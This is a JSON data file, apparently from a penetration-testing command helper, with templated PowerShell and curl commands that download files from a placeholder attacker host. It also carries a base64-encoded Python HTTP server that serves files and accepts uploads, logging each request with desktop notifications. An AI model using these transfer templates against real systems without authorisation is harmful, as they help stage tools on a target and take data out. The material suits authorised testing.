[
  {
    "id": "http-download",
    "keywords": ["download", "http", "curl", "iwr", "get"],
    "cmds": [
      {
        "win": 0,
        "label": "Powershell iwr",
        "platform": "windows",
        "terminal": ["ps", "cmd"],
        "allowTerminalWrap": true,
        "cmd": "iwr http://__AHOST__:__APORT__/__PATH__/__FILE__ -outfile __FILE__"
      },
      {
        "win": 0,
        "label": "curl Linux",
        "platform": "linux",
        "terminal": ["sh", "bash"],
        "allowTerminalWrap": true,
        "cmd": "curl -m __TIMEOUT_SEC__ -L http://__AHOST__:__APORT__/__PATH__/__FILE__ -outfile __FILE__ -o __FILE__"
      },
      {
        "win": 1,
        "label": "python custom http server",
        "platform": "linux|windows",
        "terminal": ["sh", "bash", "ps", "cmd"],
        "cmd": "python custom_server.py __APORT__",
        "allowTerminalWrap": false,
        "code": [
          {
            "filename": "custom_server.py",
            "data": "aW1wb3J0IGh0dHAuc2VydmVyCmZyb20gdXJsbGliLnBhcnNlIGltcG9ydCBwYXJzZV9xcywgdXJscGFyc2UKaW1wb3J0IGFyZ3BhcnNlCmltcG9ydCBzdWJwcm9jZXNzCmltcG9ydCBvcy5wYXRoCiMgaW1wb3J0IGpzb24KCmRlZiBtYWluKFBPUlQpOgogICAgY2xhc3MgQ3VzdG9tSFRUUFJlcXVlc3RIYW5kbGVyKGh0dHAuc2VydmVyLlNpbXBsZUhUVFBSZXF1ZXN0SGFuZGxlcik6CiAgICAgICAgCiAgICAgICAgZGVmIGRvX0dFVChzZWxmKToKICAgICAgICAgICAgIyBEZWJ1ZyB0aGUgR0VUIHJlcXVlc3QgcGFyYW1ldGVycwogICAgICAgICAgICBwYXJzZWRfdXJsID0gdXJscGFyc2Uoc2VsZi5wYXRoKQogICAgICAgICAgICBwYXJhbWV0ZXJzID0gcGFyc2VfcXMocGFyc2VkX3VybC5xdWVyeSkKICAgICAgICAgICAgcHJpbnQoIj09PUdFVD09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PSIpCiAgICAgICAgICAgIHByaW50KGYiUGF0aDoge3BhcnNlZF91cmwucGF0aH1cblBhcmFtZXRlcnM6IHtwYXJzZWRfdXJsLnF1ZXJ5fSIpCgogICAgICAgICAgICByZXF1ZXN0ZWRfcGF0aCA9IHNlbGYudHJhbnNsYXRlX3BhdGgoc2VsZi5wYXRoKQogICAgICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhyZXF1ZXN0ZWRfcGF0aCk6CiAgICAgICAgICAgICAgICBzdWJwcm9jZXNzLnJ1bihbIm5vdGlmeS1zZW5kIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiLXUiLCAibm9ybWFsIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiLXQiLCAiNjAwMCIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJy1pJywgIi91c3Ivc2hhcmUvaWNvbnMvZ25vbWUvNDh4NDgvYWN0aW9ucy9kb2N1bWVudC1zYXZlLnBuZyIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZiJHRVQge3BhcnNlZF91cmwucGF0aH0iLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICIyMDAgLSBGaWxlIEZvdW5kIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgXSkKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHN1YnByb2Nlc3MucnVuKFsibm90aWZ5LXNlbmQiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICItdSIsICJub3JtYWwiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICItdCIsICI2MDAwIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnLWknLCAiL3Vzci9zaGFyZS9pY29ucy9nbm9tZS80OHg0OC9hY3Rpb25zL3Byb2Nlc3Mtc3RvcC5wbmciLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGYiR0VUIHtwYXJzZWRfdXJsLnBhdGh9IiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiNDA0IC0gTk9UIEZvdW5kIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgXSkKCiAgICAgICAgICAgICMgSWYgdGhlIGZpbGUgZXhpc3RzIGluIHRoZSBjdXJyZW50IGRpcmVjdG9yeSwgc2VydmUgaXQsIG90aGVyd2lzZSBzZW5kIGEgNDA0LgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBzdXBlcigpLmRvX0dFVCgpCiAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIHByaW50KGYiZXJyb3IgZW5jb3VudGVyZWQgd2hpbGUgc2VydmluZzoge3BhcnNlZF91cmwucGF0aH0iKQogICAgICAgICAgICAgICAgc3VicHJvY2Vzcy5ydW4oWyJub3RpZnktc2VuZCIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIi11IiwgIm5vcm1hbCIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIi10IiwgIjYwMDAiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICctaScsICIvdXNyL3NoYXJlL2ljb25zL2dub21lLzQ4eDQ4L2FjdGlvbnMvcHJvY2Vzcy1zdG9wLnBuZyIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZiJHRVQge3BhcnNlZF91cmwucGF0aH0iLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICI1MDAgLSBJbnRlcm5hbCBFcnJvciIKICAgICAgICAgICAgICAgICAgICAgICAgICAgIF0pCgogICAgICAgIGRlZiBkb19QT1NUKHNlbGYpOgogICAgICAgICAgICAjIGZvciBmaWxlIHVwbG9hZHMsIGV4cGVjdCBhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0gYW5kIC91cGxvYWQgcm91dGUKICAgICAgICAgICAgaWYgc2VsZi5wYXRoLmxvd2VyKCkgPT0gJy91cGxvYWQnOgogICAgICAgICAgICAgICAgcHJpbnQoJ2ZpbGUgdXBsb2FkJykKCiAgICAgICAgICAgICAgICBjb250ZW50X2xlbmd0aCA9IGludChzZWxmLmhlYWRlcnNbJ0NvbnRlbnQtTGVuZ3RoJ10pCiAgICAgICAgICAgICAgICBib2R5ID0gc2VsZi5yZmlsZS5yZWFkKGNvbnRlbnRfbGVuZ3RoKQoKICAgICAgICAgICAgICAgICMgVE9ETzogcmFuZG9taXplIHRoaXMgZmlsZW5hbWUgaW4gdGhlIHRtcC8gZm9sZGVyCiAgICAgICAgICAgICAgICAjIFRPRE86IGVuc3VyZSB0aGUgdG1wIGZvbGRlciBleGlzdHMgd2hlbiBzdGFydGluZyB0aGlzIHNjcmlwdAogICAgICAgICAgICAgICAgZmlsZV9wYXRoID0gJ3RtcC91cGxvYWQxLmZpbGUnCiAgICAgICAgICAgICAgICB3aXRoIG9wZW4oZmlsZV9wYXRoLCAnd2InKSBhcyBmOgogICAgICAgICAgICAgICAgICAgIGYud3JpdGUoYm9keSkKCiAgICAgICAgICAgICAgICBzdWJwcm9jZXNzLnJ1bihbIm5vdGlmeS1zZW5kIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIi11IiwgIm5vcm1hbCIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICItdCIsICI2MDAwIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJy1pJywgIi91c3Ivc2hhcmUvaWNvbnMvZ25vbWUvNDh4NDgvYWN0aW9ucy9pbnNlcnQtdGV4dC5wbmciLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmIlBPU1Qge3NlbGYucGF0aH0iLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmIjIwMCAtIFJlY3Yge2NvbnRlbnRfbGVuZ3RofSBieXRlcyIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBdKQoKICAgICAgICAgICAgICAgIHNlbGYuc2VuZF9yZXNwb25zZSgyMDApCiAgICAgICAgICAgICAgICBzZWxmLmVuZF9oZWFkZXJzKCkKICAgICAgICAgICAgICAgIHNlbGYud2ZpbGUud3JpdGUoYidQT1NUIHJlcXVlc3QgcmVjZWl2ZWQnKQoKCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAjIGZvciBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQgb3IgbXVsdGlwYXJ0L2Zvcm0tZGF0YSBhdCBhbnkgcm91dGU6CiAgICAgICAgICAgICAgICAjIERlYnVnIHRoZSBQT1NUIHJlcXVlc3QgYm9keQogICAgICAgICAgICAgICAgY29udGVudF9sZW5ndGggPSBpbnQoc2VsZi5oZWFkZXJzLmdldCgnQ29udGVudC1MZW5ndGgnKSkKICAgICAgICAgICAgICAgIHBvc3RfZGF0YSA9IHNlbGYucmZpbGUucmVhZChjb250ZW50X2xlbmd0aCkuZGVjb2RlKCd1dGYtOCcpCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICMgQXNzdW1pbmcgUE9TVCBkYXRhIGlzIHNlbnQgYXMgJ2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCcgb3IgJ211bHRpcGFydC9mb3JtLWRhdGEnCiAgICAgICAgICAgICAgICAjcG9zdF92YXJzID0gcGFyc2VfcXMocG9zdF9kYXRhLmRlY29kZSgndXRmLTgnKSwga2VlcF9ibGFua192YWx1ZXM9VHJ1ZSkKICAgICAgICAgICAgICAgIHByaW50KCI9PT1QT1NUPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09IikKICAgICAgICAgICAgICAgIHByaW50KGYiUGF0aDoge3NlbGYucGF0aH1cbkJvZHk6IHtwb3N0X2RhdGF9IikKCiAgICAgICAgICAgICAgICBzdWJwcm9jZXNzLnJ1bihbIm5vdGlmeS1zZW5kIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIi11IiwgIm5vcm1hbCIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICItdCIsICI2MDAwIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJy1pJywgIi91c3Ivc2hhcmUvaWNvbnMvZ25vbWUvNDh4NDgvYWN0aW9ucy9pbnNlcnQtdGV4dC5wbmciLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmIlBPU1Qge3NlbGYucGF0aH0iLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmIjIwMCAtIFJlY3Yge2NvbnRlbnRfbGVuZ3RofSBieXRlcyIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBdKQoKICAgICAgICAgICAgICAgICMgUHJvdmlkZSBhIHJlc3BvbnNlIHRvIHRoZSBjbGllbnQKICAgICAgICAgICAgICAgIHNlbGYuc2VuZF9yZXNwb25zZSgyMDApCiAgICAgICAgICAgICAgICBzZWxmLmVuZF9oZWFkZXJzKCkKICAgICAgICAgICAgICAgIHNlbGYud2ZpbGUud3JpdGUoYidQT1NUIHJlcXVlc3QgcmVjZWl2ZWQgYW5kIGxvZ2dlZC4nKQoKICAgIHdpdGggaHR0cC5zZXJ2ZXIuSFRUUFNlcnZlcigoJycsIFBPUlQpLCBDdXN0b21IVFRQUmVxdWVzdEhhbmRsZXIpIGFzIGh0dHBkOgogICAgICAgIHByaW50KGYiU2VydmluZyBhdCBwb3J0IHtQT1JUfSIpCiAgICAgICAgaHR0cGQuc2VydmVfZm9yZXZlcigpCgppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOgogICAgcGFyc2VyID0gYXJncGFyc2UuQXJndW1lbnRQYXJzZXIoZGVzY3JpcHRpb249IlN0YXJ0IGFuIEhUVFAgc2VydmVyIG9uIGEgc3BlY2lmaWMgcG9ydC4iKQogICAgcGFyc2VyLmFkZF9hcmd1bWVudCgncG9ydCcsIHR5cGU9aW50LCBoZWxwPSJQb3J0IHRvIHN0YXJ0IHRoZSBIVFRQIHNlcnZlciBvbiIpCiAgICBhcmdzID0gcGFyc2VyLnBhcnNlX2FyZ3MoKQoKICAgIHRyeToKICAgICAgICBtYWluKGFyZ3MucG9ydCkKICAgIGV4Y2VwdCBLZXlib2FyZEludGVycnVwdDoKICAgICAgICBwcmludCgiXG5DbG9zaW5nIHNlcnZlci4uLiIpCgo="
          }
        ]
      }
    ]
  }
]
